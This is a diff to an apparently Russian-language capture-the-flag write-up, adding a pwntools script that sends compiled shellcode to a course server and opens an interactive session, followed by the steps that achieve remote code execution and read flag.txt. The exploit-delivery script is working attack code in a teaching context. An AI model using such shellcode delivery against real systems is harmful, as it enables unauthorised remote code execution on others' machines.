@@ -30,5 +30,24 @@ _start:
 	syscall
 ```
 
+И надо поменять e.py, я не до конца понял, что там за ересь написана. Содержимое должно быть таким:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+def main():
+    r = remote("is-course.ru", 2400)
+    with open('shellcode.bin', "rb") as f:
+        data = f.read()
+    r.send(data)
+
+    r.interactive()
+
+if __name__ == '__main__':
+    main()
+```
+
 Компилируем его с помощью скрипта, который нам любезно положили в архив, выполняем e.py и получаем RCE. Пишем `ls`, видим, что там есть flag.txt. Пишем `cat flag.txt` и получаем флаг.
 
